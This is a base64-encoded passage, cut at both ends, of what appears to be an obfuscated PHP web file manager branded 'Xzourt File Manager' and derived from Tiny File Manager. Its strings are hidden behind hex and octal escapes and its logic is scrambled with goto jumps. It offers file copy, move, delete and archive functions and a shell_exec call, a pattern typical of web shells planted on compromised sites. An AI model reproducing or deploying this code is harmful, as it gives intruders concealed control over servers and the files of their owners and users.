DE2NFwxNDNceDY4XHg2OVwxNTZcMTQ3XDQwXDE0MVx4NzJcMTQzXHg2OFwxNTFcMTY2XDE0NVx4MjBceDY5XHg2ZVx4NjZcMTU3Il0gPSAiXHg0NVwxNjJceDcyXDE1N1wxNjJceDIwXDE2N1x4NjhceDY5XDE1NFwxNDVcNDBcMTQ2XDE0NVwxNjRceDYzXHg2OFwxNTFceDZlXDE0N1w0MFwxNDFcMTYyXDE0M1wxNTBcMTUxXDE2NlwxNDVceDIwXDE1MVx4NmVceDY2XDE1NyI7ICR0clsiXDE0NVx4NmUiXVsiXHg0NFwxNDVcMTU0XDE0NVwxNjRcMTQ1XHgyMFx4NzNceDY1XHg2Y1x4NjVcMTQzXDE2NFx4NjVcMTQ0XDQwXHg2NlwxNTFcMTU0XDE0NVwxNjNceDIwXDE0MVx4NmVcMTQ0XHgyMFx4NjZceDZmXHg2Y1wxNDRcMTQ1XHg3Mlx4NzNceDNmIl0gPSAiXDEwNFx4NjVceDZjXDE0NVwxNjRcMTQ1XHgyMFx4NzNceDY1XHg2Y1wxNDVceDYzXDE2NFx4NjVcMTQ0XDQwXHg2NlwxNTFceDZjXDE0NVwxNjNceDIwXDE0MVwxNTZceDY0XDQwXHg2NlwxNTdceDZjXHg2NFwxNDVceDcyXHg3M1w3NyI7ICR0clsiXHg2NVwxNTYiXVsiXHg1M1wxNDVceDYxXDE2Mlx4NjNcMTUwXHgyMFwxNDZceDY5XHg2Y1wxNDVcNDBcMTUxXHg2ZVw0MFwxNDZcMTU3XHg2Y1x4NjRcMTQ1XDE2Mlw0MFwxNDFceDZlXDE0NFw0MFwxNjNceDc1XDE0Mlx4NjZcMTU3XHg2Y1wxNDRceDY1XDE2Mlx4NzNcNTZcNTZceDJlIl0gPSAiXHg1M1wxNDVcMTQxXHg3MlwxNDNceDY4XHgyMFx4NjZceDY5XDE1NFx4NjVceDIwXHg2OVwxNTZceDIwXHg2NlwxNTdcMTU0XDE0NFx4NjVcMTYyXDQwXHg2MVwxNTZcMTQ0XDQwXDE2M1x4NzVceDYyXHg2Nlx4NmZcMTU0XHg2NFwxNDVcMTYyXHg3M1w1Nlx4MmVceDJlIjsgJHRyWyJceDY1XHg2ZSJdWyJcMTAxXHg2M1x4NjNceDY1XDE2M1x4NzNcNDBceDY0XHg2NVx4NmVcMTUxXHg2NVx4NjRceDJlXDQwXDExMVx4NTBceDIwXHg3Mlx4NjVcMTYzXHg3NFwxNjJceDY5XDE0M1wxNjRceDY5XHg2ZlwxNTZcNDBcMTQxXDE2MFx4NzBcMTU0XHg2OVwxNDNceDYxXHg2MlwxNTRceDY1Il0gPSAiXHg0MVwxNDNcMTQzXHg2NVx4NzNceDczXHgyMFwxNDRceDY1XHg2ZVx4NjlcMTQ1XHg2NFw1Nlx4MjBcMTExXDEyMFw0MFwxNjJceDY1XDE2M1x4NzRceDcyXHg2OVwxNDNcMTY0XHg2OVwxNTdcMTU2XDQwXHg2MVx4NzBceDcwXDE1NFx4NjlceDYzXHg2MVx4NjJceDZjXHg2NSI7ICR0clsiXDE0NVx4NmUiXVsiXDExMVwxNTZceDc2XHg2MVwxNTRcMTUxXDE0NFw0MFx4NjNcMTUwXHg2MVwxNjJceDYxXDE0M1wxNjRceDY1XDE2MlwxNjNceDIwXDE1MVwxNTZceDIwXDE0Nlx4NjlceDZjXHg2NVw0MFx4NmZcMTYyXHgyMFx4NjZceDZmXHg2Y1wxNDRceDY1XDE2Mlw0MFx4NmVcMTQxXHg2ZFwxNDUiXSA9ICJcMTExXDE1NlwxNjZceDYxXHg2Y1x4NjlcMTQ0XHgyMFwxNDNceDY4XHg2MVx4NzJceDYxXHg2M1x4NzRceDY1XHg3Mlx4NzNcNDBcMTUxXHg2ZVw0MFx4NjZcMTUxXHg2Y1x4NjVceDIwXDE1N1wxNjJceDIwXDE0NlwxNTdceDZjXHg2NFx4NjVceDcyXDQwXDE1NlwxNDFceDZkXHg2NSI7ICR0clsiXHg2NVx4NmUiXVsiXHg0ZlwxNjBceDY1XHg3Mlx4NjFceDc0XHg2OVwxNTdcMTU2XDE2M1x4MjBceDc3XDE1MVx4NzRcMTUwXDQwXDE0MVx4NzJcMTQzXHg2OFx4NjlcMTY2XHg2NVx4NzNcNDBcMTQxXDE2Mlx4NjVceDIwXDE1NlwxNTdceDc0XDQwXHg2MVwxNjZceDYxXHg2OVx4NmNceDYxXHg2Mlx4NmNceDY1Il0gPSAiXHg0ZlwxNjBcMTQ1XDE2MlwxNDFceDc0XDE1MVwxNTdcMTU2XHg3M1x4MjBceDc3XHg2OVx4NzRceDY4XHgyMFx4NjFceDcyXDE0M1wxNTBcMTUxXHg3Nlx4NjVceDczXHgyMFwxNDFceDcyXHg2NVw0MFwxNTZceDZmXHg3NFw0MFx4NjFcMTY2XDE0MVwxNTFcMTU0XHg2MVx4NjJcMTU0XHg2NSI7ICR0clsiXDE0NVx4NmUiXVsiXHg0NlwxNTFceDZjXDE0NVx4MjBcMTU3XDE2Mlx4MjBcMTQ2XDE1N1x4NmNcMTQ0XDE0NVwxNjJceDIwXHg3N1wxNTFcMTY0XHg2OFx4MjBcMTY0XHg2OFx4NjlcMTYzXHgyMFx4NzBcMTQxXHg3NFwxNTBcNDBcMTQxXHg2Y1x4NzJceDY1XDE0MVwxNDRceDc5XHgyMFx4NjVcMTcwXHg2OVwxNjNcMTY0XHg3MyJdID0gIlx4NDZceDY5XHg2Y1wxNDVcNDBceDZmXDE2Mlx4MjBcMTQ2XHg2Zlx4NmNcMTQ0XHg2NVx4NzJcNDBcMTY3XDE1MVwxNjRcMTUwXDQwXDE2NFwxNTBceDY5XDE2M1w0MFx4NzBceDYxXDE2NFwxNTBcNDBcMTQxXHg2Y1wxNjJceDY1XHg2MVx4NjRceDc5XHgyMFwxNDVceDc4XDE1MVx4NzNcMTY0XHg3MyI7ICR0clsiXDE0NVx4NmUiXVsiXDExNVwxNTdceDc2XHg2NVx4NjRceDIwXDE0NlwxNjJcMTU3XHg2ZCJdID0gIlwxMTVcMTU3XDE2Nlx4NjVcMTQ0XDQwXHg2NlwxNjJceDZmXDE1NSI7ICRpMThuID0gZm1fZ2V0X3RyYW5zbGF0aW9ucygkdHIpOyAkdHIgPSAkaTE4biA/ICRpMThuIDogJHRyOyBpZiAoIXN0cmxlbigkbGFuZykpIHsgJGxhbmcgPSAiXDE0NVwxNTYiOyB9IGlmIChpc3NldCgkdHJbJGxhbmddWyR0eHRdKSkgeyByZXR1cm4gZm1fZW5jKCR0clskbGFuZ11bJHR4dF0pOyB9IGVsc2UgeyBpZiAoaXNzZXQoJHRyWyJceDY1XHg2ZSJdWyR0eHRdKSkgeyByZXR1cm4gZm1fZW5jKCR0clsiXHg2NVx4NmUiXVskdHh0XSk7IH0gZWxzZSB7IHJldHVybiAieyR0eHR9IjsgfSB9IH0gZ290byBwb0hHUzsgdDNfZ1M6IGRlZmluZSgiXHg0Nlx4NGRceDVmXDEyMFwxMDFceDU0XDExMCIsICRwKTsgZ290byB3dmdqazsgREpROWY6ICRzaG93X2hpZGRlbl9maWxlcyA9IGlzc2V0KCRjZmctPmRhdGFbIlwxNjNcMTUwXHg2ZlwxNjdcMTM3XHg2OFwxNTFceDY0XDE0NFwxNDVcMTU2Il0pID8gJGNmZy0+ZGF0YVsiXDE2M1wxNTBcMTU3XDE2N1wxMzdcMTUwXDE1MVx4NjRceDY0XHg2NVwxNTYiXSA6IHRydWU7IGdvdG8ga3ljeHQ7IEhYcU5OOiBpZiAoaXNzZXQoJF9QT1NUWyJceDYzXDE1N1x4NzBcMTcxIl0pICYmICFGTV9SRUFET05MWSkgeyAkY29weV9maWxlcyA9IGlzc2V0KCRfUE9TVFsiXDE0NlwxNTFcMTU0XDE0NSJdKSA/ICRfUE9TVFsiXHg2Nlx4NjlcMTU0XHg2NSJdIDogbnVsbDsgaWYgKCFpc19hcnJheSgkY29weV9maWxlcykgfHwgZW1wdHkoJGNvcHlfZmlsZXMpKSB7IGZtX3NldF9tc2cobG5nKCJceDRlXHg2Zlx4NzRcMTUwXDE1MVx4NmVceDY3XDQwXDE2M1x4NjVcMTU0XDE0NVwxNDNceDc0XHg2NVwxNDQiKSwgIlx4NjFcMTU0XDE0NVwxNjJcMTY0Iik7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gIlx4M2ZceDcwXDc1IiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gZm1fc2hvd19oZWFkZXIoKTsgZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgPz4KICAgIDxkaXYgY2xhc3M9InBhdGgiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgPD9waHAgIGVjaG8gZm1fZ2V0X3RoZW1lKCk7ID8+CiI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj4KICAgICAgICAgICAgICAgIDxoNj48P3BocCAgZWNobyBsbmcoIlwxMDNcMTU3XDE2MFwxNzFcMTUxXHg2ZVx4NjciKTsgPz4KPC9oNj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwIiB2YWx1ZT0iPD9waHAgIGVjaG8gZm1fZW5jKEZNX1BBVEgpOyA/PgoiPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbmlzaCIgdmFsdWU9IjEiPgogICAgICAgICAgICAgICAgICAgIDw/cGhwICBmb3JlYWNoICgkY29weV9maWxlcyBhcyAkY2YpIHsgZWNobyAiXDc0XDE1MVwxNTZceDcwXDE2NVx4NzRcNDBcMTY0XHg3OVx4NzBcMTQ1XDc1XHgyMlwxNTBcMTUxXHg2NFx4NjRceDY1XDE1Nlx4MjJceDIwXHg2ZVwxNDFcMTU1XDE0NVx4M2RceDIyXHg2NlwxNTFceDZjXHg2NVx4NWJcMTM1XDQyXDQwXDE2NlwxNDFceDZjXDE2NVwxNDVcNzVceDIyIiAuIGZtX2VuYygkY2YpIC4gIlw0Mlx4M2UiIC4gUEhQX0VPTDsgfSA/PgogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJicmVhay13b3JkIj48P3BocCAgZWNobyBsbmcoIlx4NDZceDY5XDE1NFwxNDVcMTYzIik7ID8+CjogPGI+PD9waHAgIGVjaG8gaW1wbG9kZSgiXHgzY1w1N1wxNDJcNzZcNTRcNDBceDNjXHg2Mlx4M2UiLCAkY29weV9maWxlcyk7ID8+CjwvYj48L3A+CiAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9ImJyZWFrLXdvcmQiPjw/cGhwICBlY2hvIGxuZygiXHg1M1x4NmZceDc1XDE2MlwxNDNceDY1XHg0Nlx4NmZcMTU0XHg2NFx4NjVcMTYyIik7ID8+CjogPD9waHAgIGVjaG8gZm1fZW5jKGZtX2NvbnZlcnRfd2luKEZNX1JPT1RfUEFUSCAuICJcNTciIC4gRk1fUEFUSCkpOyA/Pgo8YnI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImlucF9jb3B5X3RvIj48P3BocCAgZWNobyBsbmcoIlwxMDRceDY1XHg3M1x4NzRceDY5XHg2ZVx4NjFceDc0XDE1MVx4NmZcMTU2XHg0Nlx4NmZceDZjXHg2NFx4NjVceDcyIik7ID8+Cjo8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgZWNobyBGTV9ST09UX1BBVEg7ID8+Ci88aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29weV90byIgaWQ9ImlucF9jb3B5X3RvIiB2YWx1ZT0iPD9waHAgIGVjaG8gZm1fZW5jKEZNX1BBVEgpOyA/PgoiPgogICAgICAgICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0iY3VzdG9tLWNoZWNrYm94IGN1c3RvbS1jb250cm9sIj48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im1vdmUiIHZhbHVlPSIxIiBpZD0ianMtbW92ZS1maWxlcyIgY2xhc3M9ImN1c3RvbS1jb250cm9sLWlucHV0Ij48bGFiZWwgZm9yPSJqcy1tb3ZlLWZpbGVzIiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtbGFiZWwiIHN0eWxlPSJ2ZXJ0aWNhbC1hbGlnbjogc3ViIj4gPD9waHAgIGVjaG8gbG5nKCJcMTE1XDE1N1wxNjZcMTQ1Iik7ID8+CjwvbGFiZWw+PC9wPgogICAgICAgICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc3VjY2VzcyI+PGkgY2xhc3M9ImZhIGZhLWNoZWNrLWNpcmNsZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NDNceDZmXHg3MFx4NzkiKTsgPz4KPC9idXR0b24+ICZuYnNwOwogICAgICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1wcmltYXJ5Ij48aSBjbGFzcz0iZmEgZmEtdGltZXMtY2lyY2xlIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXDEwM1wxNDFceDZlXHg2M1x4NjVcMTU0Iik7ID8+CjwvYT48L2I+CiAgICAgICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPD9waHAgIGZtX3Nob3dfZm9vdGVyKCk7IGRpZTsgfSBnb3RvIEkwMmpxOyBCdkp3QTogPz4KPC90aD4KICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgPC90aGVhZD4KICAgICAgICAgICAgPD9waHAgIGdvdG8geFhGbHY7IFQxdlRFOiBpZiAoIUZNX1JFQURPTkxZKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgPHRoIHN0eWxlPSJ3aWR0aDozJSIgY2xhc3M9ImN1c3RvbS1jaGVja2JveC1oZWFkZXIiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjdXN0b20tY29udHJvbCBjdXN0b20tY2hlY2tib3giPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtaW5wdXQiIGlkPSJqcy1zZWxlY3QtYWxsLWl0ZW1zIiBvbmNsaWNrPSJjaGVja2JveF90b2dnbGUoKSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1jb250cm9sLWxhYmVsIiBmb3I9ImpzLXNlbGVjdC1hbGwtaXRlbXMiPjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvdGg+PD9waHAgIH0gZ290byBHb244djsgSGIwaDc6IGlmICghRk1fUkVBRE9OTFkpIHsgPz4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTkiPgogICAgICAgICAgICA8dWwgY2xhc3M9Imxpc3QtaW5saW5lIGZvb3Rlci1hY3Rpb24iPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWlubGluZS1pdGVtIj4gPGEgaHJlZj0iIy9zZWxlY3QtYWxsIiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIiBvbmNsaWNrPSJzZWxlY3RfYWxsKCk7cmV0dXJuIGZhbHNlOyI+PGkgY2xhc3M9ImZhIGZhLWNoZWNrLXNxdWFyZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NTNceDY1XHg2Y1x4NjVceDYzXDE2NFx4NDFceDZjXHg2YyIpOyA/PgogPC9hPjwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtaW5saW5lLWl0ZW0iPjxhIGhyZWY9IiMvdW5zZWxlY3QtYWxsIiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIiBvbmNsaWNrPSJ1bnNlbGVjdF9hbGwoKTtyZXR1cm4gZmFsc2U7Ij48aSBjbGFzcz0iZmEgZmEtd2luZG93LWNsb3NlIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXHg1NVwxNTZceDUzXDE0NVwxNTRcMTQ1XHg2M1wxNjRcMTAxXDE1NFx4NmMiKTsgPz4KIDwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWlubGluZS1pdGVtIj48YSBocmVmPSIjL2ludmVydC1hbGwiIGNsYXNzPSJidG4gYnRuLXNtYWxsIGJ0bi1vdXRsaW5lLXByaW1hcnkgYnRuLTIiIG9uY2xpY2s9ImludmVydF9hbGwoKTtyZXR1cm4gZmFsc2U7Ij48aSBjbGFzcz0iZmEgZmEtdGgtbGlzdCI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMTFcMTU2XHg3NlwxNDVcMTYyXDE2NFwxMjNcMTQ1XHg2Y1x4NjVceDYzXHg3NFwxNTFceDZmXHg2ZSIpOyA/PgogPC9hPjwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtaW5saW5lLWl0ZW0iPjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJoaWRkZW4iIG5hbWU9ImRlbGV0ZSIgaWQ9ImEtZGVsZXRlIiB2YWx1ZT0iRGVsZXRlIiBvbmNsaWNrPSJyZXR1cm4gY29uZmlybSgnPD9waHAgIGVjaG8gbG5nKCJcMTA0XHg2NVwxNTRceDY1XDE2NFwxNDVcNDBceDczXHg2NVwxNTRceDY1XHg2M1wxNjRceDY1XDE0NFw0MFx4NjZcMTUxXDE1NFx4NjVceDczXHgyMFx4NjFcMTU2XDE0NFx4MjBcMTQ2XHg2ZlwxNTRcMTQ0XHg2NVx4NzJceDczXHgzZiIpOyA/PgonKSI+CiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYS1kZWxldGUnKS5jbGljaygpOyIgY2xhc3M9ImJ0biBidG4tc21hbGwgYnRuLW91dGxpbmUtcHJpbWFyeSBidG4tMiI+PGkgY2xhc3M9ImZhIGZhLXRyYXNoIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXHg0NFwxNDVcMTU0XDE0NVx4NzRcMTQ1Iik7ID8+CiA8L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1pbmxpbmUtaXRlbSI+PGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImhpZGRlbiIgbmFtZT0iemlwIiBpZD0iYS16aXAiIHZhbHVlPSJ6aXAiIG9uY2xpY2s9InJldHVybiBjb25maXJtKCc8P3BocCAgZWNobyBsbmcoIlx4NDNcMTYyXHg2NVwxNDFceDc0XDE0NVw0MFwxNDFceDcyXHg2M1wxNTBcMTUxXHg3NlwxNDVcNzciKTsgPz4KJykiPgogICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2EtemlwJykuY2xpY2soKTsiIGNsYXNzPSJidG4gYnRuLXNtYWxsIGJ0bi1vdXRsaW5lLXByaW1hcnkgYnRuLTIiPjxpIGNsYXNzPSJmYSBmYS1maWxlLWFyY2hpdmUtbyI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NWFceDY5XDE2MCIpOyA/PgogPC9hPjwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtaW5saW5lLWl0ZW0iPjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJoaWRkZW4iIG5hbWU9InRhciIgaWQ9ImEtdGFyIiB2YWx1ZT0idGFyIiBvbmNsaWNrPSJyZXR1cm4gY29uZmlybSgnPD9waHAgIGVjaG8gbG5nKCJceDQzXHg3Mlx4NjVcMTQxXHg3NFx4NjVceDIwXDE0MVx4NzJcMTQzXDE1MFwxNTFceDc2XHg2NVx4M2YiKTsgPz4KJykiPgogICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2EtdGFyJykuY2xpY2soKTsiIGNsYXNzPSJidG4gYnRuLXNtYWxsIGJ0bi1vdXRsaW5lLXByaW1hcnkgYnRuLTIiPjxpIGNsYXNzPSJmYSBmYS1maWxlLWFyY2hpdmUtbyI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NTRceDYxXDE2MiIpOyA/PgogPC9hPjwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtaW5saW5lLWl0ZW0iPjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJoaWRkZW4iIG5hbWU9ImNvcHkiIGlkPSJhLWNvcHkiIHZhbHVlPSJDb3B5Ij4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLWNvcHknKS5jbGljaygpOyIgY2xhc3M9ImJ0biBidG4tc21hbGwgYnRuLW91dGxpbmUtcHJpbWFyeSBidG4tMiI+PGkgY2xhc3M9ImZhIGZhLWZpbGVzLW8iPjwvaT4gPD9waHAgIGVjaG8gbG5nKCJceDQzXHg2Zlx4NzBceDc5Iik7ID8+CiA8L2E+PC9saT4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMyBkLW5vbmUgZC1zbS1ibG9jayI+PGEgaHJlZj0iaHR0cHM6Ly90aW55ZmlsZW1hbmFnZXIuZ2l0aHViLmlvIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImZsb2F0LXJpZ2h0IHRleHQtbXV0ZWQiPlh6b3VydCBGaWxlIE1hbmFnZXIgPD9waHAgIGVjaG8gVkVSU0lPTjsgPz4KPC9hPjwvZGl2PgogICAgICAgIDw/cGhwICB9IGVsc2UgeyA/PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIiPjxhIGhyZWY9Imh0dHBzOi8vdGlueWZpbGVtYW5hZ2VyLmdpdGh1Yi5pbyIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJmbG9hdC1yaWdodCB0ZXh0LW11dGVkIj5Yem91cnQgRmlsZSBNYW5hZ2VyIDw/cGhwICBlY2hvIFZFUlNJT047ID8+CjwvYT48L2Rpdj4KICAgICAgICA8P3BocCAgfSBnb3RvIEpZRGNPOyBOa0IyTzogZnVuY3Rpb24gZm1fZ2V0X2ltYWdlX2V4dHMoKSB7IHJldHVybiBhcnJheSgiXDE1MVx4NjNcMTU3IiwgIlwxNDdceDY5XDE0NiIsICJcMTUyXHg3MFx4NjciLCAiXHg2YVx4NzBceDY1XDE0NyIsICJcMTUyXHg3MFwxNDMiLCAiXDE1MlwxNjBcNjIiLCAiXDE1MlwxNjBcMTcwIiwgIlwxNzBceDYyXDE1NSIsICJcMTY3XDE0Mlx4NmRcMTYwIiwgIlx4NzBcMTU2XHg2NyIsICJceDYyXHg2ZFx4NzAiLCAiXDE2NFwxNTFcMTQ2IiwgIlwxNjRceDY5XHg2NlwxNDYiLCAiXDE2MFx4NzNcMTQ0IiwgIlx4NzNceDc2XDE0NyIsICJcMTY3XHg2NVx4NjJcMTYwIiwgIlwxNDFcMTY2XDE1MVx4NjYiKTsgfSBnb3RvIGRib3lFOyByOGRVZjogZnVuY3Rpb24gZm1fZ2V0X21pbWVfdHlwZSgkZmlsZV9wYXRoKSB7IGlmIChmdW5jdGlvbl9leGlzdHMoIlx4NjZceDY5XHg2ZVx4NjZceDZmXDEzN1wxNTdceDcwXHg2NVx4NmUiKSkgeyAkZmluZm8gPSBmaW5mb19vcGVuKEZJTEVJTkZPX01JTUVfVFlQRSk7ICRtaW1lID0gZmluZm9fZmlsZSgkZmluZm8sICRmaWxlX3BhdGgpOyBmaW5mb19jbG9zZSgkZmluZm8pOyByZXR1cm4gJG1pbWU7IH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoIlx4NmRcMTUxXDE1NVwxNDVceDVmXDE0M1x4NmZceDZlXDE2NFwxNDVcMTU2XHg3NFx4NWZceDc0XHg3OVwxNjBceDY1IikpIHsgcmV0dXJuIG1pbWVfY29udGVudF90eXBlKCRmaWxlX3BhdGgpOyB9IGVsc2VpZiAoIXN0cmlzdHIoaW5pX2dldCgiXHg2NFwxNTFceDczXHg2MVwxNDJcMTU0XDE0NVwxMzdcMTQ2XHg3NVwxNTZcMTQzXHg3NFwxNTFceDZmXHg2ZVwxNjMiKSwgIlwxNjNceDY4XHg2NVwxNTRcMTU0XHg1ZlwxNDVceDc4XHg2NVx4NjMiKSkgeyAkZmlsZSA9IGVzY2FwZXNoZWxsYXJnKCRmaWxlX3BhdGgpOyAkbWltZSA9IHNoZWxsX2V4ZWMoIlwxNDZceDY5XHg2Y1x4NjVcNDBceDJkXHg2Mlx4NjlceDIwIiAuICRmaWxlKTsgcmV0dXJuICRtaW1lOyB9IGVsc2UgeyByZXR1cm4gIlw1NVw1NSI7IH0gfSBnb3RvIG5meGMzOyB0MlVJUjogaWYgKCFpc3NldCgkX0dFVFsiXDE2MCJdKSAmJiBlbXB0eSgkX0ZJTEVTKSkgeyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJceDNmXHg3MFx4M2QiKTsgfSBnb3RvIEp5S0M2OyBvMndoUTogaWYgKGlzc2V0KCRfR0VUWyJcMTYzXHg2NVx4NzRcMTY0XHg2OVx4NmVcMTQ3XHg3MyJdKSAmJiAhRk1fUkVBRE9OTFkpIHsgZm1fc2hvd19oZWFkZXIoKTsgZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgZ2xvYmFsICRjZmcsICRsYW5nLCAkbGFuZ19saXN0OyA/PgoKICAgIDxkaXYgY2xhc3M9ImNvbC1tZC04IG9mZnNldC1tZC0yIHB0LTMiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiA8P3BocCAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4KIj4KICAgICAgICAgICAgPGg2IGNsYXNzPSJjYXJkLWhlYWRlciI+CiAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtY29nIj48L2k+ICA8P3BocCAgZWNobyBsbmcoIlwxMjNceDY1XDE2NFwxNjRceDY5XHg2ZVwxNDdceDczIik7ID8+CiAgICAgICAgICAgICAgICA8YSBocmVmPSI/cD08P3BocCAgZWNobyBGTV9QQVRIOyA/PgoiIGNsYXNzPSJmbG9hdC1yaWdodCI+PGkgY2xhc3M9ImZhIGZhLXdpbmRvdy1jbG9zZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NDNcMTQxXHg2ZVx4NjNcMTQ1XDE1NCIpOyA/Pgo8L2E+CiAgICAgICAgICAgIDwvaDY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICAgICAgICA8Zm9ybSBpZD0ianMtc2V0dGluZ3MtZm9ybSIgYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZGF0YS10eXBlPSJhamF4IiBvbnN1Ym1pdD0icmV0dXJuIHNhdmVfc2V0dGluZ3ModGhpcykiPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIHZhbHVlPSJzZXR0aW5ncyIgYXJpYS1sYWJlbD0iaGlkZGVuIiBhcmlhLWhpZGRlbj0idHJ1ZSI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCByb3ciPgogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1sYW5ndWFnZSIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCAgZWNobyBsbmcoIlx4NGNceDYxXHg2ZVx4NjdcMTY1XDE0MVx4NjdcMTQ1Iik7ID8+CjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS01Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9ImpzLWxhbmd1YWdlIiBuYW1lPSJqcy1sYW5ndWFnZSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgIGZ1bmN0aW9uIGdldFNlbGVjdGVkKCRsKSB7IGdsb2JhbCAkbGFuZzsgcmV0dXJuICRsYW5nID09ICRsID8gIlx4NzNcMTQ1XHg2Y1x4NjVcMTQzXHg3NFwxNDVcMTQ0IiA6ICcnOyB9IGZvcmVhY2ggKCRsYW5nX2xpc3QgYXMgJGsgPT4gJHYpIHsgZWNobyAiXDc0XDE1N1x4NzBceDc0XDE1MVwxNTdcMTU2XHgyMFwxNjZcMTQxXHg2